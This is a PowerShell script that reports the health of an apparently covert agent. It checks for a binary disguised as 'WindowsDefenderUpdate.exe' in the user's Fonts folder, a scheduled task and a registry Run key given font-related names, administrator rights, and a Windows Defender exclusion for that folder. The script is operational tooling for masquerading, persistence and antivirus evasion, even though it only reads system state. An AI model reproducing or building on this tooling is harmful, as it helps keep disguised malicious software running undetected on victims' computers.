$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

$fontsFolder = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
$agentPath   = "$fontsFolder\WindowsDefenderUpdate.exe"

# 1. Agent process
$proc = Get-Process -Name "WindowsDefenderUpdate" -ErrorAction SilentlyContinue
$procRunning = $proc -ne $null
$procPID     = if ($procRunning) { $proc[0].Id } else { $null }

# 2. Admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# 3. Scheduled task
$task = Get-ScheduledTask -TaskName "WindowsFontCache" -ErrorAction SilentlyContinue
$taskExists = $task -ne $null
$taskRunLevel = if ($taskExists) { $task.Principal.RunLevel } else { $null }

# 4. Registry Run key
$reg = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsFontHelper" -ErrorAction SilentlyContinue
$regExists = $reg -ne $null

# 5. Defender exclusion
$exclusions = (Get-MpPreference).ExclusionPath
$defenderExcluded = $exclusions -contains $fontsFolder

# 6. Agent binary on disk
$binaryExists = Test-Path $agentPath

# --- Build report with green/red circles ---
$green = "🟢"
$red   = "🔴"

$report = @()
$report += "============== Agent Status Report =============="
$report += "Agent Process:      $($procRunning ? "$green Running (PID $procPID)" : "$red Not Running")"
$report += "Admin Privileges:   $($isAdmin ? "$green Yes" : "$red No")"
$report += "Scheduled Task:     $($taskExists ? "$green Present (RunLevel: $taskRunLevel)" : "$red Missing")"
$report += "Registry Run Key:   $($regExists ? "$red Present (may conflict)" : "$green Clean")"
$report += "Defender Exclusion: $($defenderExcluded ? "$green Folder excluded" : "$red Not excluded")"
$report += "Agent Binary:       $($binaryExists ? "$green Exists at $agentPath" : "$red Missing")"
$report += "================================================"

$report -join "`n"
